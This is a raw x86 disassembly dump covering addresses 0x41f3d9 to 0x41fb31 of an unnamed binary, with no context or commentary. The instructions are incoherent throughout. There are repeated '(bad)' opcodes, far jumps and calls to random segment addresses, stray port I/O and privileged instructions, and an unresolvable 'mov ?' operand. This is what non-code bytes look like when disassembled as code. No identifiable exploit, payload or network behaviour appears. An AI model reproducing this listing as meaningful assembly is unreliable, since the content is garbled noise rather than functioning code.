  41f3d9:	xor    BYTE PTR [ebp-0x926737e],bl
  41f3df:	mov    ch,0xdb
  41f3e1:	je     0x41f382
  41f3e3:	jns    0x41f37f
  41f3e5:	imul   ebx,ebx,0xfd7f84fe
  41f3eb:	cmp    DWORD PTR [edx+0x2f3706b9],ebx
  41f3f1:	pop    ebx
  41f3f2:	cmc    
  41f3f3:	scas   al,BYTE PTR es:[edi]
  41f3f4:	inc    ebp
  41f3f5:	mov    bl,cl
  41f3f7:	xor    BYTE PTR [ecx+0x3e1c817],ch
  41f3fd:	(bad)  
  41f3fe:	ja     0x41f47b
  41f400:	pusha  
  41f401:	test   al,0x85
  41f403:	cmp    BYTE PTR [ecx],dl
  41f405:	add    cl,BYTE PTR [esi+ecx*4-0x29772c2a]
  41f40c:	xchg   edi,eax
  41f40d:	push   ss
  41f40e:	popa   
  41f40f:	xor    esp,DWORD PTR [edi-0x24]
  41f412:	aas    
  41f413:	shl    edx,cl
  41f415:	push   ds
  41f416:	push   edx
  41f417:	idiv   edx
  41f419:	js     0x41f460
  41f41b:	adc    eax,DWORD PTR [edi-0x6]
  41f41e:	dec    esi
  41f41f:	mov    ebp,0x3e91191e
  41f424:	dec    edx
  41f425:	xor    DWORD PTR [edx],eax
  41f427:	addr16 aas 
  41f429:	sub    eax,DWORD PTR [esi]
  41f42b:	adc    DWORD PTR [ebx],edi
  41f42d:	push   ds
  41f42e:	aas    
  41f42f:	push   ecx
  41f430:	adc    BYTE PTR [edx+0x78],dl
  41f433:	push   esi
  41f434:	ret    
  41f435:	jmp    DWORD PTR [edi]
  41f437:	pop    ss
  41f438:	hlt    
  41f439:	es ret 
  41f43b:	ins    BYTE PTR es:[edi],dx
  41f43c:	sub    eax,0xde372785
  41f441:	hlt    
  41f442:	jmp    0xd0783f89
  41f447:	jl     0x41f47b
  41f449:	arpl   WORD PTR [eax+edx*8+0x34],sp
  41f44d:	lahf   
  41f44e:	mov    bh,0x30
  41f450:	sbb    ebp,esp
  41f452:	push   eax
  41f453:	imul   ebx,esp,0xffffffa7
  41f456:	pop    edx
  41f457:	xchg   edi,eax
  41f458:	fwait
  41f459:	imul   ebp,DWORD PTR [edx+0x10],0x7e844309
  41f460:	mov    cl,0x83
  41f462:	loop   0x41f3f2
  41f464:	ins    BYTE PTR es:[edi],dx
  41f465:	call   0xac537dea
  41f46a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f46b:	scas   al,BYTE PTR es:[edi]
  41f46c:	lods   al,BYTE PTR ds:[esi]
  41f46d:	shr    BYTE PTR [ecx+0x1e575748],0x4d
  41f474:	iret   
  41f475:	cld    
  41f476:	or     ch,BYTE PTR [ecx]
  41f478:	mov    eax,0x361c7202
  41f47d:	dec    ecx
  41f47e:	fld    TBYTE PTR [eax+0x33b9d45f]
  41f484:	pushf  
  41f485:	fs inc eax
  41f487:	dec    edx
  41f488:	repnz add eax,0x5c4d904e
  41f48e:	push   0x2c608c7a
  41f493:	pop    es
  41f494:	sbb    ch,BYTE PTR [esi+0x1a]
  41f497:	test   al,0xc4
  41f499:	ins    DWORD PTR es:[edi],dx
  41f49a:	pop    fs
  41f49c:	pop    esp
  41f49d:	xlat   BYTE PTR ds:[ebx]
  41f49e:	mov    ah,0xde
  41f4a0:	sbb    eax,0x4ba6abaa
  41f4a5:	fsub   DWORD PTR [ebp-0x4081b568]
  41f4ab:	push   ebx
  41f4ac:	add    DWORD PTR [edi-0x75afc4fb],ecx
  41f4b2:	dec    edi
  41f4b3:	add    al,0xd6
  41f4b5:	jmp    0x2437:0xe1173223
  41f4bc:	and    ch,BYTE PTR [esi+0x69]
  41f4bf:	out    dx,al
  41f4c0:	mov    eax,ebp
  41f4c2:	mov    al,BYTE PTR [eax]
  41f4c4:	cdq    
  41f4c5:	lods   eax,DWORD PTR ds:[esi]
  41f4c6:	dec    edi
  41f4c7:	push   0x1317ff7e
  41f4cc:	or     DWORD PTR [edi],ebx
  41f4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4cf:	pop    eax
  41f4d0:	xchg   esi,eax
  41f4d1:	pop    edx
  41f4d2:	jg     0x41f461
  41f4d4:	(bad)  
  41f4d5:	jmp    0x8afd:0xded0ff31
  41f4dc:	jbe    0x41f4bd
  41f4de:	inc    esi
  41f4df:	lea    ecx,[edi]
  41f4e1:	mov    bl,0xb2
  41f4e3:	ds stos DWORD PTR es:[edi],eax
  41f4e5:	pop    ecx
  41f4e6:	cmp    al,0x51
  41f4e8:	fstp   QWORD PTR [eax-0x93583ee]
  41f4ef:	(bad)  
  41f4f0:	js     0x41f554
  41f4f2:	jecxz  0x41f4e6
  41f4f4:	clc    
  41f4f5:	xor    eax,0x745a1bca
  41f4fa:	arpl   WORD PTR [ebx],bx
  41f4fc:	rol    esp,0xa2
  41f4ff:	stc    
  41f500:	cli    
  41f501:	sub    al,0xb0
  41f503:	jnp    0x41f4be
  41f505:	js     0x41f4e7
  41f507:	inc    ebp
  41f508:	mov    ds:0x7a9d5d50,al
  41f50d:	adc    BYTE PTR [eax-0x5b],dl
  41f510:	pop    esp
  41f511:	and    ebx,0x45
  41f514:	icebp  
  41f515:	cmp    eax,0x5759d0fe
  41f51a:	push   edx
  41f51b:	jp     0x41f4c7
  41f51d:	or     esp,ebp
  41f51f:	aaa    
  41f520:	dec    edi
  41f521:	sub    eax,DWORD PTR [eax-0x6]
  41f524:	fsubr  QWORD PTR [edi-0x8b92afe]
  41f52a:	xchg   edx,eax
  41f52b:	and    cl,BYTE PTR [eax*8+0x752f0696]
  41f532:	mov    BYTE PTR [eax],dl
  41f534:	(bad)  
  41f536:	sbb    eax,DWORD PTR [ebp+0x4c]
  41f539:	xchg   ebp,eax
  41f53a:	sahf   
  41f53b:	inc    esp
  41f53c:	inc    esp
  41f53d:	pop    ebp
  41f53e:	stos   BYTE PTR es:[edi],al
  41f53f:	fcom   DWORD PTR [edi-0x2f]
  41f542:	pop    edi
  41f543:	or     dl,0x94
  41f546:	fs fcmovbe st,st(1)
  41f549:	fld    DWORD PTR [ebp-0x115e872a]
  41f54f:	push   edx
  41f550:	mov    ebp,0xffb5943b
  41f555:	std    
  41f556:	or     bl,bh
  41f558:	inc    eax
  41f559:	and    ebx,ebp
  41f55b:	ds into 
  41f55d:	and    al,0x4c
  41f55f:	out    dx,eax
  41f560:	pop    edi
  41f561:	imul   edx,DWORD PTR [ebp-0x36],0xfce4879e
  41f568:	pop    es
  41f569:	rcl    ah,0xb2
  41f56c:	(bad)  
  41f56d:	stos   DWORD PTR es:[edi],eax
  41f56e:	test   BYTE PTR [edi+esi*8+0x3],bh
  41f572:	inc    edi
  41f573:	adc    DWORD PTR [ecx-0x4f],esi
  41f576:	push   0xffffffca
  41f578:	enter  0xfab6,0xa9
  41f57c:	mov    eax,ds:0xc9cbb915
  41f581:	out    0xc2,eax
  41f583:	push   edi
  41f584:	test   BYTE PTR [edi-0x6c29f39a],bh
  41f58a:	mov    esp,0x652c4162
  41f58f:	stos   DWORD PTR es:[edi],eax
  41f590:	in     al,dx
  41f591:	icebp  
  41f592:	and    dl,bh
  41f594:	fs (bad) 
  41f596:	lea    ecx,[ebp+0x63232c60]
  41f59c:	push   edi
  41f59d:	jl     0x41f5c0
  41f59f:	jle    0x41f606
  41f5a1:	cmp    dl,dl
  41f5a3:	(bad)  
  41f5a4:	xor    edx,DWORD PTR [ebx]
  41f5a6:	add    al,0xff
  41f5a8:	dec    ecx
  41f5a9:	mov    al,ds:0xf6a25ae2
  41f5ae:	xchg   ecx,eax
  41f5af:	icebp  
  41f5b0:	adc    esp,ebx
  41f5b2:	loop   0x41f621
  41f5b4:	or     ch,dh
  41f5b6:	repz pop ds
  41f5b8:	xchg   cl,bl
  41f5ba:	inc    ebp
  41f5bb:	push   es
  41f5bc:	popa   
  41f5bd:	es lahf 
  41f5bf:	imul   esi,DWORD PTR [eax+0xa],0xe0092c4
  41f5c6:	outs   dx,DWORD PTR ds:[esi]
  41f5c7:	mov    edi,DWORD PTR [ebx+0x3a]
  41f5ca:	stc    
  41f5cb:	iret   
  41f5cc:	fcomp  st(7)
  41f5ce:	(bad)  
  41f5cf:	mov    al,0xe
  41f5d1:	mov    DWORD PTR [edi],ebp
  41f5d3:	mov    eax,ds:0x79a0eca8
  41f5d8:	in     al,0xbc
  41f5da:	fs fs jle 0x41f573
  41f5de:	es inc eax
  41f5e0:	(bad)  
  41f5e1:	lods   al,BYTE PTR ds:[esi]
  41f5e2:	xor    BYTE PTR [edi+0x63],bh
  41f5e5:	xor    al,0xab
  41f5e7:	mov    esi,0xc3bdc273
  41f5ec:	bound  esp,QWORD PTR [eax-0x2e721433]
  41f5f2:	jge    0x41f62a
  41f5f4:	adc    al,BYTE PTR [edi+0x43]
  41f5f7:	fcom   QWORD PTR [eax]
  41f5f9:	and    ecx,DWORD PTR [ebp-0x5]
  41f5fc:	mov    esp,0x33ff7f39
  41f601:	mov    dh,BYTE PTR [edi+0x461a7d8c]
  41f607:	pop    ds
  41f608:	aam    0x86
  41f60a:	adc    DWORD PTR [esi],eax
  41f60c:	adc    edx,DWORD PTR [eax+esi*1]
  41f60f:	fldenv [esi-0x78]
  41f612:	or     ebp,DWORD PTR [esi+esi*4]
  41f615:	ss cli 
  41f617:	(bad)  
  41f618:	mov    ds:0xeed9316e,al
  41f61d:	int3   
  41f61e:	and    DWORD PTR [edx+0x49d8ffdf],ebp
  41f624:	std    
  41f625:	inc    ebx
  41f626:	push   ds
  41f627:	in     eax,0x4d
  41f629:	inc    esp
  41f62a:	inc    esp
  41f62b:	push   esp
  41f62c:	icebp  
  41f62d:	jo     0x41f5f8
  41f62f:	cwde   
  41f630:	outs   dx,BYTE PTR ds:[esi]
  41f631:	lock rcl BYTE PTR [edi],0x53
  41f635:	jge    0x41f60b
  41f637:	xor    ebp,ebx
  41f639:	ss inc ebx
  41f63b:	sbb    al,0xdd
  41f63d:	gs scas eax,DWORD PTR es:[edi]
  41f63f:	pop    esp
  41f640:	pop    eax
  41f641:	mov    al,ds:0xce2d47b3
  41f646:	mov    bh,0x96
  41f648:	(bad)  
  41f649:	dec    ebp
  41f64a:	fst    QWORD PTR [ebx+0x313c2a02]
  41f650:	xchg   ecx,eax
  41f651:	push   ss
  41f652:	(bad)  [edi-0x1a]
  41f655:	lods   al,BYTE PTR ds:[esi]
  41f656:	je     0x41f662
  41f658:	ficomp DWORD PTR [eax+0xcd399bd]
  41f65e:	adc    ebp,esp
  41f660:	pop    ebx
  41f661:	ins    BYTE PTR es:[edi],dx
  41f662:	ret    
  41f663:	mov    cl,0xbd
  41f665:	mov    bl,0xa0
  41f667:	sbb    ch,BYTE PTR [ebx+0x4d]
  41f66a:	fs out 0x95,eax
  41f66d:	dec    ecx
  41f66e:	sbb    DWORD PTR [ebp+0x2c],eax
  41f671:	dec    esi
  41f672:	inc    DWORD PTR [edi+0x75]
  41f675:	lods   eax,DWORD PTR ds:[esi]
  41f676:	cmp    DWORD PTR [ebp+edx*1-0xfd8e52d],ecx
  41f67d:	jns    0x41f6c0
  41f67f:	xor    eax,0xa711f9b6
  41f684:	add    dl,ch
  41f686:	xchg   ebp,eax
  41f687:	arpl   WORD PTR [ecx],bx
  41f689:	popa   
  41f68a:	sub    eax,0xe73a0581
  41f68f:	fisubr WORD PTR [esi]
  41f691:	lods   al,BYTE PTR ds:[esi]
  41f692:	dec    esi
  41f693:	pop    edx
  41f694:	xchg   BYTE PTR [edi-0x5c],bh
  41f697:	mov    edx,0x57fe2b4d
  41f69c:	gs sbb ebp,0x55f0d41a
  41f6a3:	cld    
  41f6a4:	or     eax,ebp
  41f6a6:	popa   
  41f6a7:	sbb    DWORD PTR [ecx],ebp
  41f6a9:	cmp    BYTE PTR [ebx+0x5f],ch
  41f6ac:	xchg   esp,eax
  41f6ad:	rcl    eax,cl
  41f6af:	sub    al,0x5d
  41f6b1:	mov    ch,0x2
  41f6b3:	inc    ebp
  41f6b4:	fcmovb st,st(6)
  41f6b6:	xchg   esi,eax
  41f6b7:	fisub  DWORD PTR [edi+0x37]
  41f6ba:	jb     0x41f67d
  41f6bc:	call   0x4f34:0xcf256e46
  41f6c3:	mov    DWORD PTR [edx+0x5d4c22ef],eax
  41f6c9:	push   esi
  41f6ca:	push   ds
  41f6cb:	dec    BYTE PTR [ecx-0x78]
  41f6ce:	sar    BYTE PTR [esi+0x37ecbee3],cl
  41f6d4:	adc    edx,DWORD PTR [edi+ebp*2+0x28]
  41f6d8:	ins    BYTE PTR es:[edi],dx
  41f6d9:	cmp    eax,0xe3f2eb5b
  41f6de:	xchg   DWORD PTR [ebx-0x7937e736],ebx
  41f6e4:	outs   dx,DWORD PTR ds:[esi]
  41f6e5:	fistp  WORD PTR [ebp+0x308ea35e]
  41f6eb:	dec    eax
  41f6ec:	mov    cl,0xc2
  41f6ee:	(bad)  
  41f6ef:	fsub   DWORD PTR [edi+0x295d4a3e]
  41f6f5:	rcr    BYTE PTR [ecx+0x1a],1
  41f6f8:	fcmovbe st,st(5)
  41f6fa:	js     0x41f730
  41f6fc:	ror    DWORD PTR [edx],cl
  41f6fe:	jmp    0x41f75e
  41f700:	rcl    BYTE PTR [edi+0x2],0x8c
  41f704:	out    dx,al
  41f705:	lahf   
  41f706:	xor    eax,DWORD PTR [edx+0x34]
  41f709:	add    cl,bh
  41f70b:	scas   eax,DWORD PTR es:[edi]
  41f70c:	adc    al,0x4f
  41f70e:	inc    edi
  41f70f:	(bad)  
  41f710:	or     dl,BYTE PTR [esi]
  41f712:	and    ebx,DWORD PTR [ebx]
  41f714:	push   esi
  41f715:	outs   dx,DWORD PTR ds:[esi]
  41f716:	loopne 0x41f756
  41f718:	mov    bh,ch
  41f71a:	retf   
  41f71b:	in     eax,dx
  41f71c:	xchg   ebp,eax
  41f71d:	mov    ah,0x86
  41f71f:	xchg   esi,eax
  41f720:	jg     0x41f6bd
  41f722:	sbb    ecx,0x11706920
  41f728:	mov    ah,0xa2
  41f72a:	ds (bad) 
  41f72c:	cmp    DWORD PTR [esi],ebx
  41f72e:	sub    eax,0x485aeca7
  41f733:	fld    QWORD PTR [edi-0x52]
  41f736:	pop    ebp
  41f737:	cmp    al,BYTE PTR [edi+edx*1+0xc9a70aa]
  41f73e:	test   eax,0xff5fac30
  41f743:	test   ebx,0xd22d1683
  41f749:	(bad)  
  41f74a:	pushf  
  41f74b:	ja     0x41f731
  41f74d:	rcr    BYTE PTR [ebx-0x22f4e308],cl
  41f753:	add    ch,BYTE PTR fs:[ecx-0x4be3d5a7]
  41f75a:	xor    BYTE PTR [edx+0x6f],0x2c
  41f75e:	or     DWORD PTR [esi-0x64949a48],0xabe08958
  41f768:	pushf  
  41f769:	hlt    
  41f76a:	popf   
  41f76b:	push   0xffffffac
  41f76d:	adc    al,0xd9
  41f76f:	clc    
  41f770:	(bad)  
  41f771:	jl     0x41f6f7
  41f773:	pop    es
  41f774:	inc    ebp
  41f775:	and    al,BYTE PTR [ecx+0x616f7dbd]
  41f77b:	sub    al,0x77
  41f77d:	inc    edx
  41f77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f77f:	pusha  
  41f780:	jne    0x41f743
  41f782:	inc    edx
  41f783:	test   BYTE PTR [esi+0x3c],ah
  41f786:	push   edi
  41f787:	mov    bl,0xe8
  41f789:	test   eax,0x21bc3bc3
  41f78e:	std    
  41f78f:	sbb    dh,BYTE PTR [eax-0x1c]
  41f792:	fst    QWORD PTR [ecx+eax*1+0x7c]
  41f796:	adc    BYTE PTR ds:0x5f526f52,0x25
  41f79d:	xchg   DWORD PTR [edx],esp
  41f79f:	jecxz  0x41f760
  41f7a1:	aaa    
  41f7a2:	in     eax,dx
  41f7a3:	shl    DWORD PTR [eax+0x2c7f9a72],cl
  41f7a9:	(bad)  
  41f7aa:	fisubr WORD PTR [esi+0xaff6a2a]
  41f7b0:	xchg   BYTE PTR fs:[ebp+edx*2-0x6c],bh
  41f7b5:	cld    
  41f7b6:	mov    al,ds:0x95717df9
  41f7bb:	out    0xf9,eax
  41f7bd:	jnp    0x41f761
  41f7bf:	shr    dh,1
  41f7c1:	dec    eax
  41f7c2:	jae    0x41f787
  41f7c4:	(bad)  
  41f7c5:	push   ebp
  41f7c6:	call   0x3f6d:0x20e63b4a
  41f7cd:	jne    0x41f83e
  41f7cf:	dec    eax
  41f7d0:	daa    
  41f7d1:	stos   BYTE PTR es:[edi],al
  41f7d2:	inc    ebp
  41f7d3:	mov    esp,0x6288b79b
  41f7d8:	jo     0x41f7f3
  41f7da:	data16 arpl WORD PTR [esi+0x60],sp
  41f7de:	or     al,0x9a
  41f7e0:	cmp    al,0xb
  41f7e2:	pop    es
  41f7e3:	mov    ebx,0xdfdad243
  41f7e8:	sbb    edi,DWORD PTR [esi+0x657add62]
  41f7ee:	mov    ch,0x81
  41f7f0:	in     al,dx
  41f7f1:	test   BYTE PTR [ebx+0x4bac7f25],dl
  41f7f7:	or     al,0xd2
  41f7f9:	call   ebp
  41f7fb:	adc    al,0xd1
  41f7fd:	lea    ebx,[edx+0x69b0d440]
  41f803:	les    edx,FWORD PTR [eax-0x26]
  41f806:	cdq    
  41f807:	push   es
  41f808:	dec    edi
  41f809:	inc    edi
  41f80a:	add    bh,BYTE PTR [ecx+esi*2+0x4d]
  41f80e:	js     0x41f852
  41f810:	dec    esi
  41f811:	clc    
  41f812:	push   ecx
  41f813:	push   ss
  41f814:	dec    esi
  41f815:	and    BYTE PTR [edx+0x53],ah
  41f818:	sub    al,0xff
  41f81a:	sbb    dh,BYTE PTR [esi+0x29]
  41f81d:	mov    ecx,0x24cdaeab
  41f822:	lea    eax,[eax+edx*4-0x7]
  41f826:	adc    eax,edx
  41f828:	mov    bh,0xf1
  41f82a:	xor    bh,BYTE PTR [eax]
  41f82c:	cmp    BYTE PTR [edi],0x6e
  41f82f:	mov    ds:0xaf8bddc,eax
  41f834:	es dec esp
  41f836:	dec    edi
  41f837:	push   ds
  41f838:	pop    eax
  41f839:	test   BYTE PTR [ebp-0x8],dh
  41f83c:	mov    esp,0xe197a4ae
  41f841:	rcl    BYTE PTR [ecx],cl
  41f843:	int    0x47
  41f845:	cmp    edi,ebp
  41f847:	xor    edi,esp
  41f849:	sbb    eax,DWORD PTR [ecx+0x29]
  41f84c:	in     al,dx
  41f84d:	lock xor eax,0xb1cae747
  41f853:	lods   eax,DWORD PTR ds:[esi]
  41f854:	mov    eax,0xbffc5c58
  41f859:	repz shr BYTE PTR [edi-0x62],1
  41f85d:	jns    0x41f8c2
  41f85f:	jns    0x41f827
  41f861:	jmp    DWORD PTR [edx+0x4763f6]
  41f867:	mov    bl,0x1e
  41f869:	fbstp  TBYTE PTR ds:0x7efeed7a
  41f86f:	loop   0x41f89c
  41f871:	xor    al,0xa7
  41f873:	jae    0x41f801
  41f875:	cdq    
  41f876:	adc    edx,DWORD PTR [esi-0x5634c17c]
  41f87c:	cs and dl,bl
  41f87f:	shl    edx,cl
  41f881:	shl    bl,0x1d
  41f884:	xchg   esi,eax
  41f885:	and    al,0xa2
  41f887:	ret    
  41f888:	jns    0x41f87c
  41f88a:	iret   
  41f88b:	clc    
  41f88c:	retf   
  41f88d:	push   es
  41f88e:	xor    al,0x19
  41f890:	lods   al,BYTE PTR ds:[esi]
  41f891:	xchg   ebx,eax
  41f892:	jns    0x41f8be
  41f894:	sbb    DWORD PTR [edi+0x71b4dbfc],ecx
  41f89a:	outs   dx,BYTE PTR ds:[esi]
  41f89b:	ror    ebp,cl
  41f89d:	call   0x6e54:0x87e181e7
  41f8a4:	mov    eax,ds:0x5f9106e4
  41f8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8aa:	ficom  WORD PTR [ecx+0x47]
  41f8ad:	(bad)  
  41f8ae:	sub    eax,0xddc5c5a8
  41f8b3:	xor    BYTE PTR [edi+0x7dbfcd3e],0xde
  41f8ba:	jmp    0x2c55b1e7
  41f8bf:	pop    eax
  41f8c0:	fcmovnb st,st(2)
  41f8c2:	stc    
  41f8c3:	ja     0x41f92f
  41f8c5:	sub    DWORD PTR [edx-0x5a],esp
  41f8c8:	daa    
  41f8c9:	in     al,0x25
  41f8cb:	fsubrp st(0),st
  41f8cd:	add    eax,0x77b77ad6
  41f8d2:	cld    
  41f8d3:	inc    ecx
  41f8d4:	jle    0x41f89c
  41f8d6:	test   DWORD PTR [eax-0xd],edi
  41f8d9:	cmp    al,BYTE PTR [edi+0x72675158]
  41f8df:	sub    DWORD PTR [edx-0x12],edx
  41f8e2:	out    0xad,al
  41f8e4:	(bad)  
  41f8e5:	ins    BYTE PTR es:[edi],dx
  41f8e6:	in     al,0x2d
  41f8e8:	xor    edx,DWORD PTR [ebx+0x35]
  41f8eb:	mov    edx,0x9dba3879
  41f8f0:	lahf   
  41f8f1:	cmp    DWORD PTR [edx+0x3ca75cc1],0xbb4880d6
  41f8fb:	or     al,0xe0
  41f8fd:	mov    dh,0xe1
  41f8ff:	sbb    ebp,DWORD PTR [esi]
  41f901:	(bad)  
  41f902:	jp     0x41f938
  41f904:	cmp    BYTE PTR [edx+0x56],dl
  41f907:	jmp    0x61f2:0x734398fc
  41f90e:	cmp    eax,0xdfb949d7
  41f913:	mov    dh,BYTE PTR [edi-0x7a]
  41f916:	loopne 0x41f925
  41f918:	in     al,0x1e
  41f91a:	mov    BYTE PTR [eax+0x12],dl
  41f91d:	mov    ah,0xe4
  41f91f:	push   0xae624943
  41f924:	mov    dh,0x4
  41f926:	call   0x5801:0xe699735e
  41f92d:	pop    edx
  41f92e:	push   edx
  41f92f:	dec    edx
  41f930:	(bad)  
  41f931:	xchg   ecx,eax
  41f932:	lea    ecx,[edi]
  41f934:	mov    cl,BYTE PTR [ecx-0x702fa7ea]
  41f93a:	jl     0x41f997
  41f93c:	adc    eax,DWORD PTR [esi-0x2e03cd3f]
  41f942:	leave  
  41f943:	ret    0x9227
  41f946:	or     eax,0xfe0132bc
  41f94b:	pop    ebp
  41f94c:	cld    
  41f94d:	sahf   
  41f94e:	jl     0x41f993
  41f950:	hlt    
  41f951:	fidivr WORD PTR [edx]
  41f953:	lods   eax,DWORD PTR ds:[esi]
  41f954:	inc    edx
  41f955:	sub    al,0x72
  41f957:	xor    eax,0x77399cf8
  41f95c:	fcomp  QWORD PTR [ebx-0x24]
  41f95f:	inc    edx
  41f960:	mov    ch,0xe4
  41f962:	adc    ecx,DWORD PTR [eax]
  41f964:	in     al,dx
  41f965:	or     esp,esi
  41f967:	ins    DWORD PTR es:[edi],dx
  41f968:	rol    BYTE PTR [eax+0x4b],0x6f
  41f96c:	and    WORD PTR [ebp+0xd],ax
  41f970:	pop    edi
  41f971:	sub    eax,0x30f8478d
  41f976:	push   edx
  41f977:	test   edx,edi
  41f979:	sub    edi,DWORD PTR [esi-0x71]
  41f97c:	loopne 0x41f991
  41f97e:	inc    DWORD PTR [ecx+0x947cab7]
  41f984:	push   ss
  41f985:	cmp    BYTE PTR [ecx+0x29],ah
  41f988:	imul   esp,ecx,0xffffffd1
  41f98b:	in     eax,0x4
  41f98d:	retf   0xa348
  41f990:	int3   
  41f991:	mov    dh,0x6
  41f993:	repz popa 
  41f995:	lahf   
  41f996:	or     BYTE PTR [edx-0x7b],bh
  41f999:	test   al,0x23
  41f99b:	cwde   
  41f99c:	ss out dx,al
  41f99e:	lods   al,BYTE PTR ds:[esi]
  41f99f:	xchg   edx,eax
  41f9a0:	and    eax,0x46b3c6ad
  41f9a5:	jne    0x41fa10
  41f9a7:	ffreep st(4)
  41f9a9:	xchg   BYTE PTR [edi-0x3],ch
  41f9ac:	jg     0x41f9dd
  41f9ae:	cmp    al,0x7f
  41f9b0:	loop   0x41fa0f
  41f9b2:	pop    ebp
  41f9b3:	out    0xea,al
  41f9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9b6:	cmp    BYTE PTR [edi+esi*8],bh
  41f9b9:	int    0x59
  41f9bb:	and    ah,BYTE PTR [edx+ecx*4+0x1592d11a]
  41f9c2:	stos   DWORD PTR es:[edi],eax
  41f9c3:	test   al,0x7c
  41f9c5:	nop
  41f9c6:	pop    eax
  41f9c7:	in     al,dx
  41f9c8:	push   esp
  41f9c9:	out    dx,al
  41f9ca:	cmp    ah,BYTE PTR [ecx]
  41f9cc:	test   eax,0xc0cf6875
  41f9d1:	pop    ebp
  41f9d2:	sub    al,0x31
  41f9d4:	adc    DWORD PTR ds:0x79ba32ef,esp
  41f9da:	(bad)  
  41f9db:	push   edx
  41f9dc:	es jl  0x41f993
  41f9df:	je     0x41f9e8
  41f9e1:	mov    dl,0xe6
  41f9e3:	mov    es,WORD PTR [ecx-0x3d]
  41f9e6:	xchg   DWORD PTR [edx],ebp
  41f9e8:	dec    esi
  41f9e9:	repz push ss
  41f9eb:	adc    al,0x93
  41f9ed:	mov    dh,0x98
  41f9ef:	mov    bl,0x11
  41f9f1:	push   ecx
  41f9f2:	sbb    eax,0xb96f689d
  41f9f7:	jl     0x41f9d4
  41f9f9:	enter  0xbb64,0x83
  41f9fd:	bound  edi,QWORD PTR [ebx+0x49]
  41fa00:	int    0x51
  41fa02:	pop    edx
  41fa03:	sub    BYTE PTR [ecx],dl
  41fa05:	push   edx
  41fa06:	jmp    0xadc0b7b7
  41fa0b:	and    cl,BYTE PTR [ecx]
  41fa0d:	jns    0x41fa1a
  41fa0f:	imul   esp,DWORD PTR ds:0x9f491513,0x69
  41fa16:	enter  0x25bb,0xf4
  41fa1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1b:	jle    0x41f9b2
  41fa1d:	or     esi,esi
  41fa1f:	cwde   
  41fa20:	arpl   WORD PTR [ecx-0x2c],sp
  41fa23:	call   0x5de2:0x39a6094f
  41fa2a:	mov    ?,WORD PTR [ecx*4+0x164da458]
  41fa31:	jne    0x41fa41
  41fa33:	push   edi
  41fa34:	sbb    bh,BYTE PTR [edx]
  41fa36:	inc    edx
  41fa37:	add    BYTE PTR [eax-0x30],0x87
  41fa3b:	jo     0x41fa02
  41fa3d:	test   eax,0xe0c87690
  41fa42:	jb     0x41fa52
  41fa44:	cmp    DWORD PTR [ecx-0x7c2ef4f0],ecx
  41fa4a:	dec    eax
  41fa4b:	nop
  41fa4c:	add    DWORD PTR [eax+0x7489bfd2],eax
  41fa52:	cwde   
  41fa53:	or     DWORD PTR ds:0x732459f9,esp
  41fa59:	outs   dx,DWORD PTR ds:[esi]
  41fa5a:	and    DWORD PTR ds:0x670e5cc9,eax
  41fa60:	retf   
  41fa61:	lock nop
  41fa63:	jmp    0x41fa87
  41fa65:	inc    esp
  41fa66:	ins    BYTE PTR es:[edi],dx
  41fa67:	fcmovb st,st(4)
  41fa69:	das    
  41fa6a:	pop    es
  41fa6b:	inc    esi
  41fa6c:	jbe    0x41faac
  41fa6e:	mov    ebp,0x94f5df1c
  41fa73:	ficom  WORD PTR [esi-0x71]
  41fa76:	arpl   WORD PTR [eax+0x29],cx
  41fa79:	xor    DWORD PTR [edx+esi*2-0xf],ecx
  41fa7d:	fst    DWORD PTR [edx-0x69410acd]
  41fa83:	xchg   ebx,eax
  41fa84:	es dec ebp
  41fa86:	pop    ebx
  41fa87:	bound  esp,QWORD PTR [ecx-0x2132a9ec]
  41fa8d:	imul   esp,DWORD PTR [edi],0x7d
  41fa90:	sbb    BYTE PTR [ecx],dl
  41fa92:	mov    eax,ds:0xc40f898e
  41fa97:	or     bh,BYTE PTR [esi-0x4f1a9d2f]
  41fa9d:	fwait
  41fa9e:	test   BYTE PTR [edi-0x41],bh
  41faa1:	dec    eax
  41faa2:	jecxz  0x41fad9
  41faa4:	sbb    eax,0x1081f743
  41faa9:	dec    esi
  41faaa:	xor    ebx,0xd67ea3bf
  41fab0:	sub    DWORD PTR [ebx-0x25],ecx
  41fab3:	cmp    BYTE PTR ds:0x2805648c,dl
  41fab9:	out    0xf0,eax
  41fabb:	xlat   BYTE PTR ds:[ebx]
  41fabc:	sub    DWORD PTR [eax+0x7],ebx
  41fabf:	fcomp  DWORD PTR [edi]
  41fac1:	data16 jle 0x41faa8
  41fac4:	loopne 0x41fa5c
  41fac6:	adc    DWORD PTR [edx],ebx
  41fac8:	in     al,0xd3
  41faca:	jp     0x41fb48
  41facc:	xchg   BYTE PTR [ebx],dh
  41face:	jl     0x41fa9c
  41fad0:	loopne 0x41fa72
  41fad2:	pop    esi
  41fad3:	icebp  
  41fad4:	test   eax,0xcf502840
  41fad9:	inc    eax
  41fada:	push   0x89d7f14f
  41fadf:	pop    ss
  41fae0:	xchg   edi,eax
  41fae1:	cmp    eax,0x777fdb32
  41fae6:	jp     0x41faef
  41fae8:	in     eax,0xfa
  41faea:	jo     0x41fad9
  41faec:	aad    0xe3
  41faee:	and    DWORD PTR [edx-0x64],0xf97e25f
  41faf5:	in     al,0x45
  41faf7:	mov    esp,0x1ccfb08b
  41fafc:	mov    cl,0xb1
  41fafe:	jns    0x41faab
  41fb00:	sub    al,0x92
  41fb02:	rol    DWORD PTR [esi-0x6b967338],1
  41fb08:	xchg   edx,eax
  41fb09:	mov    al,0xb6
  41fb0b:	fist   DWORD PTR [edx]
  41fb0d:	push   esi
  41fb0e:	xlat   BYTE PTR ds:[ebx]
  41fb0f:	repz jae 0x41faeb
  41fb12:	enter  0x1dae,0x3a
  41fb16:	mov    DWORD PTR [edx],edi
  41fb18:	add    ebx,edi
  41fb1a:	and    bl,BYTE PTR [edx+0x15]
  41fb1d:	dec    ecx
  41fb1e:	fbstp  TBYTE PTR [ebx]
  41fb20:	mov    al,ds:0xc9bcf3c0
  41fb25:	or     al,0x7f
  41fb27:	cmp    al,0x68
  41fb29:	sub    eax,0x4e77b333
  41fb2e:	repz aam 0x82
  41fb31:	cdq    
